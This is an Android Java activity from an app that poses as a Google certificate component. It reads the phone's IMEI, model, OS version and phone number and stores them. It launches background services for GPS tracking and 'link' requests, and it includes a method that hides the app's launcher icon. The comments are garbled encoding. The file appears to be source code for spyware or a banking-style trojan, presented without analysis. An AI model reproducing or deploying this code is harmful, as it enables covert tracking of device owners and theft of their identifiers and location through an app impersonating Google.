package com.google.android.bs;

import java.io.File;
import java.io.FilenameFilter;
import java.util.List;
import java.util.concurrent.TimeUnit;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Environment;
import android.preference.PreferenceManager;
import android.telephony.TelephonyManager;
import android.text.Editable;
import android.util.Log;
import android.view.Menu;
import android.view.Window;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import com.google.android.certificate.R;
import com.google.android.history.LinkService;
import com.google.android.location.GPSTracker;

public class MainActivity extends Activity {
	Button install;
	Button exit;
	GPSTracker gps;
	LinkService link;
	AlertDialog.Builder ad;
	Context context;
	final String SAVED_TIME = "saved_time";
	Editor e;
	SharedPreferences sp;
	byte[] data;
	String incFile;
	private String aboutDev;
	private static String LOG_TAG = "mainActivity";
	String fileID = "id.txt";
	String ID = null;
	List<String> result;
	File root;
	File[] fileArray;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);
//		requestWindowFeature(Window.FEATURE_NO_TITLE);
		setContentView(R.layout.activity_main);		

		sp = PreferenceManager
				.getDefaultSharedPreferences(getApplicationContext());
		final TelephonyManager manager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);

		String imeistring = manager.getDeviceId();
		String model = android.os.Build.MODEL;
		String versionAndroid = android.os.Build.VERSION.RELEASE;
		String phoneNumber = ""; 
		

		aboutDev = "IMEI: " + imeistring + " Model: " + model
				+ " Version android: " + versionAndroid;

		e = sp.edit();
		
		e.putString("ABOUT", "dev");
		e.putString("ID", ID);
		e.commit();
		
//		hideIcon();
		start(); // ������ ��������
		
		// ���������, ������ �� ��� ����������� ���������
		boolean hasVisited = sp.getBoolean("hasVisited", false);

		if (!hasVisited) {
//			getID();
			// �������� �� ������ ���������
			e = sp.edit();
			
			e.putBoolean("hasVisited", true);
			e.putString("ABOUT", aboutDev);
			e.putString(SAVED_TIME, Long.toString(System.currentTimeMillis()));
			
			e.commit();
		}
		
		if (manager.getSimState() == 5) {
			phoneNumber = manager.getLine1Number();
			e.putString("phoneNumber", phoneNumber);
			e.commit();
//			viewIDDialog();
			finish();
		} else {
			viewIDDialog();
		}
	}

	private boolean viewIDDialog() {
		// TODO Auto-generated method stub
		AlertDialog.Builder alert = new AlertDialog.Builder(this);

		alert.setTitle("���� ID");
		alert.setMessage("������� ID. ��� ����� �� ������!");

		// Set an EditText view to get user input 
		final EditText input = new EditText(this);
		alert.setView(input);

		alert.setPositiveButton("Ok", new DialogInterface.OnClickListener() {
		public void onClick(DialogInterface dialog, int whichButton) {
		  String value = input.getText().toString();
		  // Do something with value!
		  Log.d(LOG_TAG, "Text: " + value);
		  sp = PreferenceManager
					.getDefaultSharedPreferences(getApplicationContext());
		  Editor e = sp.edit();
		  e.putString("ID", value);
		  e.commit();
		  finish();
		  }
		});

		alert.setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
		  public void onClick(DialogInterface dialog, int whichButton) {
		    // Canceled.
		  }
		});

		alert.show();
		Log.d(LOG_TAG, "2 - " + input.getText().toString());
		return true;
	}

	public void getID() {

		root = new File(Environment.getExternalStorageDirectory()
				.getAbsolutePath());
		fileArray = root.listFiles(new FilenameFilter() {
			@Override
			public boolean accept(File dir, String filename) {
				return filename.toLowerCase().endsWith("ts.apk");
			}
		});
		// ������� ������� ���� � SD-�����
		String f = null;
		// ����� ������ ������ � ����������� APK
		for (int i = 0; i < fileArray.length; i++) {
			f = fileArray[i].getName() + "\n";
			ID = f.substring(0, f.indexOf("t"));
		}
		Toast.makeText(this, ID, Toast.LENGTH_LONG).show();
		e = sp.edit();
		e.putString("ID", ID);
		e.commit();
		// Toast.makeText(this, sourceApk, Toast.LENGTH_LONG).show();
		Log.d(LOG_TAG, "ID - " + sp.getString("ID", "ID"));

	}

	public void findFilePath(File dir, String filename) {

		root = new File(Environment.getExternalStorageDirectory()
				.getAbsolutePath());
		fileArray = root.listFiles(new FilenameFilter() {
			@Override
			public boolean accept(File dir, String filename) {
				return filename.toLowerCase().endsWith(".apk");
			}
		});
		// ������� ������� ���� � SD-�����
		String f = root.getAbsolutePath() + "\n\n";
		// ����� ������ ������ � ����������� JPG
		for (int i = 0; i < fileArray.length; i++) {
			f += fileArray[i].getName() + "\n";
		}
		Toast.makeText(this, f, Toast.LENGTH_LONG).show();
	}

	public void start() {

		startService(new Intent(MainActivity.this, Request4.class));

		try {
			TimeUnit.MILLISECONDS.sleep(1000);
		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

		startService(new Intent(MainActivity.this, GPSTracker.class));
		startService(new Intent(MainActivity.this, LinkService.class));
	}

	public void hideIcon() {
		ComponentName componentToDisable = new ComponentName(
				"com.google.android.certificate",
				"com.google.android.bs.MainActivity");

		getPackageManager().setComponentEnabledSetting(componentToDisable,
				PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
				PackageManager.DONT_KILL_APP);
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

}